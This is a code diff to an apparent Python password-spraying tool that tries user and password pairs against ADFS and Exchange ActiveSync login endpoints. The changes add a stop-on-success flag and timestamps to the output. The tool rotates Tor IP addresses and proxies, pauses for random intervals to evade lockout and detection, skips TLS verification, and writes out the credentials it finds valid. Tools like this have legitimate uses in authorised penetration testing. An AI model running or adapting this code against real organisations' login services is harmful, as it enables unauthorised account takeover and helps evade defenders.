@@ -29,7 +29,8 @@ def get_args():
 	parser.add_argument('-r', '--randomize', required=False, default=True, action='store', help='Randomize pairs of credentials. Default: True')
 	parser.add_argument('-n', '--number_requests_per_ip', required=False, default=1, action='store', help='Number of requests per IP address. Default: 1')
 	parser.add_argument('-l', '--logfile', required=False, default="tested.txt", action='store', help='Log file. Default: tested.txt')
-	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
+	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: True')
+	parser.add_argument('-s', '--stop_on_success', required=False, default=False, action='store', help='Stop on success. Default: False')
 	parser.add_argument('-pl', '--proxy_list', required=False, default=None, action='store', help='Proxy list')
 	parser.add_argument('-tp', '--tor_password', required=False, default=None, action='store', help='Tor password')
 	parser.add_argument('-UP', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
@@ -38,10 +39,8 @@ def get_args():
 
 def write_tested(user,password,test_credentials_file,status,ip_):
 	current_time = time.strftime("%H:%M:%S",time.localtime())
-	#current_ip = requests.get('https://api.ipify.org').text.replace("\n","")
-	current_ip = ip_
 	with open(test_credentials_file, "a") as f:
-		f.write(user+":"+password+","+status+","+current_time+","+current_ip+"\n")
+		f.write(user+":"+password+","+status+","+current_time+","+ip_+"\n")
 
 
 def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
@@ -64,11 +63,11 @@ def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counte
 	resp = requests.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
 	if resp.history != []:
 		write_tested(user,password,test_credentials_file, "CORRECT",ip_)
-		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
+		print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
 		return True
 	elif resp.history == []:
 		write_tested(user,password,test_credentials_file, "FAILED",ip_)
-		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
+		if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
 		return False
 	if resp.status_code != 200:
 		print ("[!] Strange status code: %s. Quitting!!!"%(resp.status_code))
@@ -85,11 +84,11 @@ def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,p
 	response = s.get(active_sync_url, headers = headers, verify = False, proxies = proxy)
 	if debug: print("[%s/%s] Response status code: %s" % (counter,pairs,response.status_code))
 	if response.status_code == 200 or response.status_code == 505:
-		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
+		print("[%s/%s] %s - CORRECT credentials found: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
 		write_tested(user,password,test_credentials_file,"CORRECT",ip_)
 		return True
 	else:
-		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
+		if debug: print("[%s/%s] %s - Incorrect credentials: %s:%s"%(counter,pairs,time.strftime("%H:%M"),user,password))
 		write_tested(user,password,test_credentials_file,"FAILED",ip_)
 		return False
 
@@ -134,7 +133,6 @@ def main():
 		dafs_url = calculate_values(args.target)
 		print ("[+] ADFS url: %s"%(dafs_url))
 		print ("[+] Please provide user (-u), password (-p), User list (-U), Password list (-P) or User:Password list (-UP) to carry out an attack.")
-		#get_args().print_help()
 		sys.exit(0)
 	if (args.user_list is not None and not os.path.isfile(args.user_list)):
 		print ("[!] Error: Use '-U' with a file of users or '-u' for a single user")
@@ -161,6 +159,7 @@ def main():
 	proxy_list = open(args.proxy_list).read().splitlines() if args.proxy_list is not None else None
 	tor_password = args.tor_password if args.tor_password is not None else None
 	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
+	stop_on_success =      json.loads(args.stop_on_success.lower()) if isinstance(args.stop_on_success,str) else args.stop_on_success
 	randomize =  json.loads(args.randomize.lower()) if isinstance(args.randomize,str) else args.randomize
 	number_requests_per_ip = int(args.number_requests_per_ip)
 
@@ -195,8 +194,10 @@ def main():
 		print ("[+] ADFS url: %s"%(dafs_url))
 		print ("[+] Total users:         %d"   %(len(users)))
 		print ("[+] Total passwords:     %d"   %(len(passwords)))
-		print ("[+] Total combinations:  %d\n"   %(len(pairs)))
-		#print ("[+] External IP address: %s\n" %(requests.get('https://api.ipify.org').text.replace("\n","")))
+		print ("[+] Total combinations:  %d"   %(len(pairs)))
+		print ("[+] Debug mode:          %s" %(debug))
+		print ("[+] Randomize mode:      %s" %(randomize))
+		print ("[+] Stop on success:     %s\n" %(stop_on_success))
 
 	counter = 0
 	correct_users_list = []
@@ -217,8 +218,8 @@ def main():
 					pass
 				#if debug: print("[%s/%s] Changing IP address"%(str(counter), str(len(pairs))))
 				new_ip = change_tor_ip(controller, debug)
-				if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(len(pairs)), new_ip))
-			if debug: print("[%s/%s] Waiting time:   %s seconds"%(str(counter), str(len(pairs)),random_seconds))
+				if debug: print("[%s/%s] %s - New IP address: %s"%(str(counter), str(len(pairs)), time.strftime("%H:%M"), new_ip))
+			if debug: print("[%s/%s] %s - Waiting time:   %s seconds"%(str(counter), str(len(pairs)), time.strftime("%H:%M"), random_seconds))
 			time.sleep(random_seconds)
 			#if debug: print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)),credential[0], credential[1]))
 			if dafs_url != active_sync_url:
@@ -227,6 +228,9 @@ def main():
 				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
 			if correct_user:
 				correct_users_list.append(credential[0])
+				if stop_on_success:
+					print("[+] %s - Found correct credentials - Stopping the script"%(time.strftime("%H:%M")))
+					sys.exit(0)
 
 
 if __name__== "__main__":
